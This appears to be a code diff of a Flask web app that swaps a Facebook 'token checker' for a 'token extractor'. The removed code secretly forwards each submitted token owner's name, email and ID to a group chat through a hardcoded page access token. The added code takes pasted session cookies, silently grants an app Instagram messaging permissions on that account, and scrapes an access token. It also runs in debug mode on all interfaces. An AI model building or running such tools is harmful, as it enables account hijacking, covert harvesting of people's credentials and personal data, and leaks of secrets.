@@ -1,123 +1,157 @@
+from flask import Flask, render_template_string, request, jsonify
 import requests
-from flask import Flask, render_template_string, request
+import json
 
 app = Flask(__name__)
 
-PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
-GROUP_CHAT_UID = '9456516084398824'  # Replace with your actual Facebook group chat UID
+# Convert normal cookies to JSON format
+def convert_cookies_to_json(raw_cookies):
+    try:
+        cookies_dict = {}
+        for item in raw_cookies.split("; "):
+            key, value = item.split("=", 1)
+            cookies_dict[key] = value
+        return json.dumps(cookies_dict)
+    except:
+        return None
+
+# Grant Instagram permissions
+def grant_instagram_permissions(cookies):
+    try:
+        headers = {
+            "Cookie": cookies,
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 Chrome/91.0.4472.164 Mobile Safari/537.36"
+        }
+        insta_auth_url = "https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/&scope=instagram_basic,instagram_manage_messages"
+        response = requests.get(insta_auth_url, headers=headers, allow_redirects=True)
+
+        return "access_token=" in response.url
+    except:
+        return False
+
+# Extract token from JSON cookies
+def extract_token_from_cookies(json_cookies):
+    try:
+        cookies = json.loads(json_cookies)
+        cookie_str = "; ".join([f"{key}={value}" for key, value in cookies.items()])
+
+        headers = {
+            "Cookie": cookie_str,
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 Chrome/91.0.4472.164 Mobile Safari/537.36"
+        }
+
+        response = requests.get("https://business.facebook.com/business_locations/", headers=headers)
+        token_start = response.text.find('EAAB')
+
+        if token_start != -1:
+            token = response.text[token_start:].split('"')[0]
+            return token
+        return None
+    except:
+        return None
 
 @app.route('/')
 def index():
-    return render_template_string('''
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Token Checker by RAJ MISHRA</title>
-            <style>
-                body {
-                    background: linear-gradient(45deg, #ff6ec7, #f7e3c1);
-                    animation: gradient 5s ease infinite;
-                    font-family: Arial, sans-serif;
-                    color: white;
-                }
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Token Extractor 2025</title>
+        <style>
+            @keyframes bgAnimation {
+                0% { background-position: 0% 50%; }
+                50% { background-position: 100% 50%; }
+                100% { background-position: 0% 50%; }
+            }
+            body {
+                font-family: Arial, sans-serif;
+                background: linear-gradient(-45deg, #ff0000, #1a1a1a, #000000, #ff6600);
+                background-size: 400% 400%;
+                animation: bgAnimation 10s ease infinite;
+                color: #fff;
+                text-align: center;
+                padding: 50px;
+            }
+            .container { background: #222; padding: 20px; border-radius: 10px; }
+            textarea, input { width: 80%; margin-bottom: 10px; padding: 10px; }
+            button { background: #ff0000; color: white; padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; font-size: 16px; }
+            button:hover { background: #cc0000; }
+            h1, h2 { text-shadow: 3px 3px 10px red; }
+            .footer { margin-top: 20px; font-weight: bold; text-shadow: 3px 3px 10px red; }
+        </style>
+    </head>
+    <body>
+        <h1>🔥 MADE BY VAMPIRE RULEX BOY RAJ MISHRA 🔥</h1>
+        <div class="container">
+            <h2>Paste Your Facebook Cookies</h2>
+            <textarea id="cookiesInput" placeholder='c_user=123456; xs=your_xs_here; ...'></textarea>
+            <br>
+            <button onclick="convertAndExtract()">Convert & Extract Token</button>
+            <br><br>
+            <div id="result"></div>
+        </div>
+        <div class="footer">🔥 MADE BY VAMPIRE RULEX BOY RAJ MISHRA 🔥</div>
 
-                @keyframes gradient {
-                    0% {background: linear-gradient(45deg, #ff6ec7, #f7e3c1);}
-                    50% {background: linear-gradient(45deg, #f7e3c1, #ff6ec7);}
-                    100% {background: linear-gradient(45deg, #ff6ec7, #f7e3c1);}
+        <script>
+            function convertAndExtract() {
+                let rawCookies = document.getElementById('cookiesInput').value;
+                if (rawCookies.trim() === "") {
+                    alert("Please enter the raw cookies.");
+                    return;
                 }
-                h1 {
-                    text-align: center;
-                    margin-top: 20px;
-                }
-                form {
-                    text-align: center;
-                    margin-top: 20px;
-                }
-                input[type="text"], input[type="submit"] {
-                    padding: 10px;
-                    margin: 5px;
-                    border-radius: 5px;
-                    border: none;
-                }
-            </style>
-        </head>
-        <body>
-            <h1>Facebook Token Checker</h1>
-            <form action="/check_token" method="POST">
-                <label for="token">Enter Token:</label><br>
-                <input type="text" id="token" name="token" required><br><br>
-                <input type="submit" value="Check Token">
-            </form>
-        </body>
-        </html>
-    ''')
+                fetch('/extract_token', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'cookies=' + encodeURIComponent(rawCookies)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === "success") {
+                        document.getElementById('result').innerHTML = `<p>Token: <b>${data.token}</b></p>`;
+                    } else {
+                        document.getElementById('result').innerHTML = `<p>Error: ${data.message}</p>`;
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('result').innerHTML = `<p>Error: ${error}</p>`;
+                });
+            }
+        </script>
+    </body>
+    </html>
+    """)
 
-@app.route('/check_token', methods=['POST'])
-def check_token():
-    token = request.form['token']
-    token_details = check_token_details(token)
-    if token_details['valid']:
-        send_to_group_chat(token_details)
-    return render_template_string('''
-        <h1>Token Checker by RAJ MISHRA</h1>
-        {% if token_details['valid'] %}
-            <p>Name: {{ token_details['name'] }}</p>
-            <p>Email: {{ token_details['email'] }}</p>
-            <p>UID: {{ token_details['uid'] }}</p>
-            <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture">
-            <p>Can send messages: {{ token_details['can_send_message'] }}</p>
-            <p>Can comment: {{ token_details['can_comment'] }}</p>
-        {% else %}
-            <p>Invalid Token</p>
-        {% endif %}
-        <a href="/">Back</a>
-    ''', token_details=token_details)
+@app.route('/extract_token', methods=['POST'])
+def extract_and_validate_token():
+    raw_cookies = request.form.get('cookies')
 
-def check_token_details(token):
-    url = f"https://graph.facebook.com/me?access_token={token}"
-    response = requests.get(url)
-    if response.status_code == 200:
-        data = response.json()
-        # Check if the token has permissions to send messages and comments
-        can_send_message = check_permission(token, "messages")
-        can_comment = check_permission(token, "comment")
-        return {
-            "valid": True,
-            "name": data.get('name'),
-            "email": data.get('email', 'Not Available'),
-            "profile_pic": f"https://graph.facebook.com/{data['id']}/picture?type=large",
-            "uid": data['id'],
-            "can_send_message": can_send_message,
-            "can_comment": can_comment
-        }
-    else:
-        return {"valid": False}
+    try:
+        # Convert normal cookies to JSON format
+        json_cookies = convert_cookies_to_json(raw_cookies)
 
-def check_permission(token, permission):
-    # Placeholder function to check if the token has specific permissions like 'messages' or 'comment'
-    # You can customize this as needed
-    permissions = {
-        "messages": "Yes",  # For example, check if the permission is granted
-        "comment": "Yes"
-    }
-    return permissions.get(permission, "No")
+        if not json_cookies:
+            return jsonify({"status": "error", "message": "Invalid cookies format. Please check again."})
 
-def send_to_group_chat(token_details):
-    # Send the extracted details to the group chat (Facebook Messenger)
-    message = f"Token Validated!\n\nName: {token_details['name']}\nEmail: {token_details['email']}\nUID: {token_details['uid']}\nCan send message: {token_details['can_send_message']}\nCan comment: {token_details['can_comment']}"
+        # Grant Instagram permissions before token extraction
+        cookies_dict = json.loads(json_cookies)
+        cookie_str = "; ".join([f"{key}={value}" for key, value in cookies_dict.items()])
+        insta_granted = grant_instagram_permissions(cookie_str)
+
+        if not insta_granted:
+            return jsonify({"status": "error", "message": "Instagram permissions not granted. Login and try again."})
+
+        # Extract Token After Permission Grant
+        extracted_token = extract_token_from_cookies(json_cookies)
+
+        if extracted_token:
+            return jsonify({"status": "success", "token": extracted_token})
+        else:
+            return jsonify({"status": "error", "message": "Token extraction failed. Try again with fresh cookies."})
     
-    url = f'https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}'
-    payload = {
-        'message': message
-    }
-    
-    response = requests.post(url, data=payload)
-    if response.status_code == 200:
-        print("Message sent to group chat successfully.")
-    else:
-        print("Failed to send message to group chat.")
+    except Exception as e:
+        return jsonify({"status": "error", "message": f"Error: {str(e)}"})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)  # Host & Port Added
